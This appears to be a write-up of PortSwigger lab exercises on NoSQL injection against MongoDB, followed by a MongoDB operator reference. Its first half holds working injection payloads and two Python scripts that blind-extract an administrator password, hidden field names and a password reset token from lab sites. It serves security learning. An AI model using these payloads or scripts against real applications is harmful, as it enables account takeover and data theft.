---
title: Portswigger (Nosql Injection)
date: 2026-8-12 13:10:30 +0000
categories: [Portswigger]
tags: [Portswigger]
math: true
mermaid: true
media_subpath: /assets/posts/portswigger
image:
  path: preview.png
---
-
----------------

### NOSQL Injection

-----------------

- This form of query injection affects  \non sql databases e.g mongodb, cypher and others.This walkthrough focuses on mongodb attack.

----------------

- Types-:
  - Syntax injection-: This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
  - Operators injection-:  This occurs when you can use NoSQL query operators to manipulate queries.


----------------  

- Operator injection-: NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result.
- Examples-:

| **Operator** |      **Description**        |
|--------------|---------------------|
|$where | Matches documents that satisfy a JavaScript expression.|
|$ne | Matches all values that are not equal to a specified value|
|$in |Matches all of the values specified in an array. |
|$regex | Selects documents where values match a specified regular expression.|
| $nin  | not in an array |

- [More examples](https://www.w3schools.com/mongodb/mongodb_query_operators.php)
- SOlving the lab with `$nin`-:

```json
{"username":{"$nin":["carlos","wiener"]},"password":{"$ne":""}}
```

------------------

### Exploiting syntax injection to extract data

-----------------

- In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from the database.
- Brief Example-:
- Vulnerable code-:
```js
{"$where":"this.username == 'admin'"}
```
- Injecting it to dump sensitive data-:

```
admin' && this.password[0] == 'a' || 'a'=='b
```

- Oops,it is blind,let's exfil other info with `match` js function that relies on regex, you'll also notice that the last quotes is removed to match the quote in the statement-:

```
admin' && this.password.match('^a') && '1'=='1
```
- Also, you can use `startswith()` in some instances, works in a nice manner than match because of special characters usage and you just need to comment `'` with `\\'`.

```
admin' && this.password.startswith('a') && '1'=='1
```

- Dumping the password with startswith() payload + python

```python3
#! /usr/bin/env python3
import requests
import asyncio
import string

#Replace host and cookie
#necessary variables
url: str = "https://0a0800e204bc44f580d6087f008e00af.web-security-academy.net"

async def main():
     headers = {"Cookie":"session=57tR4BdA7pjntM4pix5exS2nVIjtMSI3; Secure","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36Sec-Ch-Ua: \"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Brave\";v=\"140\""}
     path = "/user/lookup"
     charset = string.ascii_letters + '1234567890' + string.punctuation 
     found_char = ""
     while True:
         for char in charset:
            special_chars = "\\'"
            if char in special_chars: char = '\\' + char
            payload = f"administrator'%26%26this.username=='administrator'%26%26this.password.startsWith('{found_char + char}')%26%26'1'=='1"
            result = requests.get(url + path + "?user="+ payload,headers=headers).text
            if len(result) ==  96:
               found_char += char
               print(f"[+] Found_char::{found_char}")
               break

if __name__ == "__main__":
    asyncio.run(main())
```

- 8 chars password-:

<img width="834" height="238" alt="image" src="https://github.com/user-attachments/assets/025a467d-7f10-40f3-bf24-1393ea568701" />

-----------------

### Extracting fields' names

----------------

- Payload-:

```js
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

- Lab's script-:

```python3
#! /usr/bin/env python3
import requests
import asyncio
import string
import itertools

url = "https://0abd006a037036f7804a6255003200ed.web-security-academy.net/login"
valid_word = "Account locked: please reset your password"
charset = "_" + string.digits + string.ascii_letters 

#FIltering chars that are special in js

async def filter_char(character: str):
     if character not in string.ascii_letters + string.digits + '!"#%&,-:;<=>@_~`': 
        return "\\" + character 
     else: 
        return character
# Finding object keys length
async def find_keysLength(index: int):
     for counter in range(80):
        payload = f"Object.keys(this)[{index}].length == {counter}"
        data = {"username":"carlos","password":{"$ne":""},"$where":payload}
        text = requests.post(url,json=data).text
        if valid_word in text:
            print(f"[+]Objectindex{index}::length:->{counter}")
            break
     return counter

async def dump_keysStrings():
    keys = []
    for counter in range(4,5):
        length = await find_keysLength(counter)
        keys.append("")
        for char_counter in range(length):
            pick_counter = counter - (counter + 1)
            for char in charset:
                char = await filter_char(char)
                payload = f"Object.keys(this)[{counter}].match('^{keys[pick_counter] + char}')"
                #print(payload)
                data = {"username":"carlos","password":{"$ne":""},"$where":payload}
                text = requests.post(url,json=data).text
                if valid_word in text:
                   keys[pick_counter] += char
                   print(f"[+] Key:index{counter}::Found Char:{keys[pick_counter]}")
                   break
            if len(keys[pick_counter]) ==  length:
                print(f"[+] Keys:{counter}'s field found::{keys[pick_counter]}")
                break
    return keys[-1]
async def dump_key(field: str) -> string:
    found_chars = ""
    while True:
        for char in charset:
            char = await filter_char(char)
            payload = f"(this.{field}).toString().match('^{found_chars + char}')"
            data = {"username":"carlos","password":{"$ne":""},"$where":payload}
            text = requests.post(url,json=data).text
            if valid_word in text:
                found_chars += char
                print(f"[+] Found chars::{found_chars}")
                break
        if len(found_chars) == 16:
            print(f"[+]Found token:: {found_chars}")
async def main():
    field =  await dump_keysStrings()
    await dump_key("resetPwdToken")
  
if __name__ == "__main__":
    asyncio.run(main())
```
- Usage ( Reset carlos' password first)-:

<img width="1231" height="578" alt="image" src="https://github.com/user-attachments/assets/6bf031f0-90eb-48fc-aff3-f2db309be654" />

- Time based injection exfiltration-:

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```
- Payload 2-:

```
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

--------------------

# 🧩 MongoDB Operators & Function Compatibility

This cheat sheet outlines which MongoDB **operators** work with which **functions/stages**.

---

## ⚙️ 1. Comparison Operators

| Operator | Description | Works In |
|-----------|--------------|-----------|
| `$eq` | Equal to | `find()`, `aggregate($match)` |
| `$ne` | Not equal to | `find()`, `aggregate($match)` |
| `$gt` | Greater than | `find()`, `aggregate($match)` |
| `$gte` | Greater than or equal | `find()`, `aggregate($match)` |
| `$lt` | Less than | `find()`, `aggregate($match)` |
| `$lte` | Less than or equal | `find()`, `aggregate($match)` |
| `$in` | Matches any value in array | `find()`, `aggregate($match)` |
| `$nin` | Not in array | `find()`, `aggregate($match)` |

---

## 🧠 2. Logical Operators

| Operator | Description | Works In |
|-----------|--------------|-----------|
| `$and` | Joins multiple conditions | `find()`, `aggregate($match)` |
| `$or` | Matches any condition | `find()`, `aggregate($match)` |
| `$nor` | Fails all conditions | `find()`, `aggregate($match)` |
| `$not` | Negates a condition | `find()`, `aggregate($match)` |

---

## 🧱 3. Element Operators

| Operator | Description | Works In |
|-----------|--------------|-----------|
| `$exists` | Checks if field exists | `find()`, `aggregate($match)` |
| `$type` | Checks BSON data type | `find()`, `aggregate($match)` |
| `$jsonSchema` | Validates JSON schema | `find()`, `aggregate()` |

---

## 🔍 4. Evaluation Operators

| Operator | Description | Works In |
|-----------|--------------|-----------|
| `$expr` | Use aggregation expressions in queries | `find()`, `aggregate($match)` |
| `$regex` | Regular expression match | `find()`, `aggregate($match)` |
| `$text` | Text search | `find()` |
| `$where` | Custom JavaScript condition | `find()` |

---

## 🧮 5. Array Operators

| Operator | Description | Works In |
|-----------|--------------|-----------|
| `$all` | Matches all values in array | `find()`, `aggregate($match)` |
| `$elemMatch` | Matches array element by condition | `find()`, `aggregate($match)` |
| `$size` | Matches array length | `find()`, `aggregate($match)` |

---

## 🧾 6. Projection Operators

| Operator | Description | Works In |
|-----------|--------------|-----------|
| `$slice` | Limit array elements | `find(projection)`, `aggregate($project)` |
| `$meta` | Access text score metadata | `find(projection)`, `aggregate($project)` |
| `$` | Positional projection | `find(projection)` |

---

## 🧱 7. Update Operators

| Operator | Description | Works In |
|-----------|--------------|-----------|
| `$set` | Set a field value | `updateOne()`, `updateMany()` |
| `$unset` | Remove a field | `updateOne()`, `updateMany()` |
| `$rename` | Rename a field | `updateOne()`, `updateMany()` |
| `$inc` | Increment numeric field | `updateOne()`, `updateMany()` |
| `$mul` | Multiply numeric field | `updateOne()`, `updateMany()` |
| `$min` | Set field to min value | `updateOne()`, `updateMany()` |
| `$max` | Set field to max value | `updateOne()`, `updateMany()` |
| `$currentDate` | Set field to current date | `updateOne()`, `updateMany()` |

### ➕ Array Update Operators

| Operator | Description | Works In |
|-----------|--------------|-----------|
| `$push` | Add element to array | `updateOne()`, `updateMany()` |
| `$addToSet` | Add unique element to array | `updateOne()`, `updateMany()` |
| `$pop` | Remove first/last element | `updateOne()`, `updateMany()` |
| `$pull` | Remove elements matching condition | `updateOne()`, `updateMany()` |
| `$pullAll` | Remove all listed elements | `updateOne()`, `updateMany()` |
| `$each` | Add multiple elements (used with `$push`) | `updateOne()`, `updateMany()` |
| `$position` | Insert array elements at index | `updateOne()`, `updateMany()` |
| `$sort` | Sort array elements | `updateOne()`, `updateMany()` |

---

## 🔄 8. Aggregation Stage Operators

| Stage | Description | Example Use |
|--------|--------------|--------------|
| `$match` | Filter documents | Similar to `find()` |
| `$project` | Select and shape fields | Create new computed fields |
| `$group` | Group documents | `{ $group: { _id: "$field", total: { $sum: 1 } } }` |
| `$sort` | Sort documents | `{ $sort: { score: -1 } }` |
| `$limit` | Limit number of docs | `{ $limit: 5 }` |
| `$skip` | Skip documents | `{ $skip: 10 }` |
| `$lookup` | Join collections | Foreign key join |
| `$unwind` | Deconstruct arrays | Flatten array fields |
| `$count` | Count documents | `{ $count: "total" }` |
| `$addFields` | Add computed fields | Similar to `$project` |
| `$replaceRoot` | Promote subdocument | — |
| `$sample` | Random selection | `{ $sample: { size: 5 } }` |
| `$merge` | Write aggregation output to collection | — |

---

## 💡 9. Bitwise Operators

| Operator | Description | Works In |
|-----------|--------------|-----------|
| `$bitsAllSet` | All bits are set | `find()`, `aggregate($match)` |
| `$bitsAnySet` | Any bit is set | `find()`, `aggregate($match)` |
| `$bitsAllClear` | All bits are clear | `find()`, `aggregate($match)` |
| `$bitsAnyClear` | Any bit is clear | `find()`, `aggregate($match)` |

---

## 🌍 10. Geospatial Operators

| Operator | Description | Works In |
|-----------|--------------|-----------|
| `$geoWithin` | Geometry within a boundary | `find()`, `aggregate($match)` |
| `$geoIntersects` | Intersects a geometry | `find()`, `aggregate($match)` |
| `$near` | Sort by proximity | `find()`, `aggregate($match)` |
| `$nearSphere` | Spherical proximity | `find()`, `aggregate($match)` |
| `$center`, `$box`, `$polygon` | Define shapes | `find()` |

---

## 🧩 11. Cursor/Query Chain Functions (Not Operators)

| Function | Purpose | Works On |
|-----------|----------|----------|
| `.sort()` | Sort results | `find()`, cursor |
| `.limit()` | Limit number of results | `find()`, cursor |
| `.skip()` | Skip results | `find()`, cursor |
| `.count()` | Count documents | `find()`, cursor |
| `.toArray()` | Convert cursor to array | `find()` |
| `.forEach()` | Iterate results | `find()` |

---

## ⚡ Summary Table

| Operator/Method | Works In |
|------------------|----------|
| Query operators (`$eq`, `$gt`, `$in`, etc.) | `find()`, `$match` |
| Logical (`$and`, `$or`, etc.) | `find()`, `$match` |
| Update (`$set`, `$inc`, etc.) | `updateOne()`, `updateMany()` |
| Array updates (`$push`, `$pull`, etc.) | `updateOne()`, `updateMany()` |
| Aggregation stages (`$group`, `$project`, etc.) | `aggregate()` |
| Cursor methods (`.limit()`, `.sort()`, etc.) | `find()` |
| Geospatial (`$geoWithin`, `$near`) | `find()`, `$match` |

---

📘 **Notes**
- Operators **starting with `$`** are used inside MongoDB queries, updates, or pipelines.
- Cursor methods (`.limit()`, `.skip()`, etc.) are **JavaScript methods**, not operators.
- `$limit`, `$sort`, `$skip` **only work inside** the aggregation framework, not in plain queries.

---

